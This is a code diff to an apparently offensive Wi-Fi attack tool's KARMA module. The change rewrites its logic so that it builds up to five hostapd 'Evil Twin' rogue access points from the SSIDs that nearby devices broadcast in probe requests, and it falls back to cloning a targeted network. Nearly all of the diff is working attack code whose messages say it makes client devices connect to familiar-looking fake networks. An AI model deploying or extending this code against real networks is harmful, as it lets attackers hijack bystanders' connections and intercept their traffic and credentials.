@@ -3061,12 +3061,20 @@ class AttackKARMA(Attack):
             return False
     
     def create_hostapd_config(self):
-        """Create hostapd configuration file for exact network clones"""
+        """Create hostapd configuration file for PNL-based Evil Twins"""
         try:
-            # Find the best real network to clone (one that users likely have saved)
+            # CRITICAL FIX: Use PNL networks instead of target network
             target_network = self.find_best_network_to_clone()
             
-            if not target_network:
+            if target_network is None and hasattr(self, 'pnl_networks') and self.pnl_networks:
+                # Use PNL networks (the correct KARMA approach)
+                Color.pl('{+} {G}Creating Evil Twins from probe requests (PNL) - OLD CODE APPROACH{W}')
+                return self._create_pnl_based_configs()
+            elif target_network:
+                # Fallback to target network if no PNL
+                Color.pl('{!} {O}No PNL available - falling back to target network{W}')
+                return self._create_target_based_configs(target_network)
+            else:
                 error_msg = 'No suitable networks found to clone'
                 Color.pl('{!} {R}%s{W}' % error_msg)
                 Color.pl('{!} {O}This usually means no networks with clients were found during scanning{W}')
@@ -3122,37 +3130,105 @@ class AttackKARMA(Attack):
             Color.pl('{!} {R}Failed to create hostapd configs: {O}%s{W}' % str(e))
             return False
     
-    def find_best_network_to_clone(self):
-        """Find the best real network to clone based on client activity, popularity, and user selection"""
+    def _create_pnl_based_configs(self):
+        """Create Evil Twin configs based on probe requests (PNL) - OLD CODE APPROACH"""
         try:
-            best_network = None
-            max_score = 0
+            Color.pl('{+} {G}Creating Evil Twins from probe requests - this is why old code worked!{W}')
             
-            # First, check if user selected a specific target
-            user_target = getattr(self, 'target', None)
-            if user_target and user_target.essid:
-                Color.pl('{+} {C}Looking for user-selected target: {G}%s{W}' % user_target.essid)
-                
-                # Look for the user's selected network first
-                for network in self.real_networks:
-                    if network.essid == user_target.essid:
-                        Color.pl('{+} {G}Found user-selected target: {C}%s{W} - prioritizing this network{W}' % network.essid)
-                        Color.pl('{+} {G}Target network has {C}%d{W} clients{W}' % len(network.clients))
-                        
-                        # Show clients for the selected target
-                        if network.clients:
-                            Color.pl('{+} {C}Clients on selected target:{W}')
-                            for client in network.clients:
-                                Color.pl('  {G}* {W}Client: {C}%s{W}' % client.station)
-                        else:
-                            Color.pl('{!} {O}Warning: Selected target has no detected clients{W}')
-                            Color.pl('{!} {O}This may reduce attack effectiveness{W}')
-                        
-                        return network
-                
-                Color.pl('{!} {O}User-selected target {G}%s{O} not found in scanned networks{W}' % user_target.essid)
-                Color.pl('{!} {O}Falling back to automatic network selection{W}')
+            # Get a good channel (use target channel or default)
+            target_channel = 6  # Default channel
+            if hasattr(self, 'target') and self.target and self.target.channel:
+                target_channel = self.target.channel
+            elif hasattr(self, 'real_networks') and self.real_networks:
+                target_channel = self.real_networks[0].channel
             
+            Color.pl('{+} {C}Using channel {G}%d{W} for Evil Twins{W}' % target_channel)
+            
+            # Create configs for PNL SSIDs
+            self.hostapd_configs = []
+            created_count = 0
+            
+            for ssid in list(self.pnl_networks):
+                if ssid and ssid != '<MISSING>' and ssid.strip() and len(ssid) <= 32:
+                    config = self.create_single_hostapd_config(ssid, target_channel, None)
+                    if config:
+                        self.hostapd_configs.append(config)
+                        created_count += 1
+                        Color.pl('{+} {G}Created Evil Twin: {C}%s{W}' % ssid)
+                        
+                        # Limit to 5 Evil Twins to avoid overwhelming
+                        if created_count >= 5:
+                            break
+            
+            if created_count > 0:
+                Color.pl('{+} {G}Successfully created {C}%d{W} Evil Twins from probe requests{W}' % created_count)
+                Color.pl('{+} {G}Clients will now connect to familiar SSIDs from their PNL!{W}')
+                return True
+            else:
+                Color.pl('{!} {R}Failed to create any Evil Twin configs from PNL{W}')
+                return False
+                
+        except Exception as e:
+            Color.pl('{!} {R}Error creating PNL-based configs: {O}%s{W}' % str(e))
+            return False
+    
+    def _create_target_based_configs(self, target_network):
+        """Create Evil Twin configs based on target network (fallback)"""
+        try:
+            target_ssid = target_network.essid
+            target_bssid = target_network.bssid
+            target_channel = target_network.channel
+            
+            Color.pl('{+} {G}Creating Evil Twin for target network: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
+            
+            # Create config for the target network
+            self.hostapd_configs = []
+            config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid)
+            if config:
+                self.hostapd_configs.append(config)
+                Color.pl('{+} {G}Created Evil Twin for: {C}%s{W}' % target_ssid)
+                return True
+            else:
+                Color.pl('{!} {R}Failed to create Evil Twin config{W}')
+                return False
+                
+        except Exception as e:
+            Color.pl('{!} {R}Error creating target-based configs: {O}%s{W}' % str(e))
+            return False
+    
+    def find_best_network_to_clone(self):
+        """Find the best network to clone - prioritize PNL SSIDs over target network"""
+        try:
+            # CRITICAL FIX: Don't clone the target network - clone PNL networks instead!
+            # This is why the old code worked - it created Evil Twins with DIFFERENT SSIDs
+            
+            Color.pl('{+} {C}KARMA Strategy: Creating Evil Twins from probe requests (PNL), not target network{W}')
+            
+            # Check if we have captured probe requests (PNL)
+            if hasattr(self, 'pnl_networks') and self.pnl_networks:
+                Color.pl('{+} {G}Found {C}%d{W} SSIDs from probe requests (PNL){W}' % len(self.pnl_networks))
+                
+                # Show captured SSIDs
+                Color.pl('{+} {C}Captured SSIDs from nearby devices:{W}')
+                for i, ssid in enumerate(list(self.pnl_networks)[:5], 1):  # Show first 5
+                    if ssid and ssid != '<MISSING>' and ssid.strip():
+                        Color.pl('  {G}%d.{W} {C}%s{W}' % (i, ssid))
+                
+                # Return None to indicate we should use PNL networks, not real networks
+                Color.pl('{+} {G}Will create Evil Twins for PNL SSIDs - clients will connect to familiar networks{W}')
+                return None
+            else:
+                Color.pl('{!} {O}No probe requests captured - falling back to target network{W}')
+                # Fallback to original logic if no PNL
+                return self._find_fallback_network()
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error finding best network to clone: {O}%s{W}' % str(e))
+            return None
+    
+    def _find_fallback_network(self):
+        """Fallback method to find a real network when no PNL is available"""
+        try:
             # If user target not found or not specified, use original logic
             Color.pl('{+} {C}Selecting best network automatically based on client activity and popularity{W}')
             
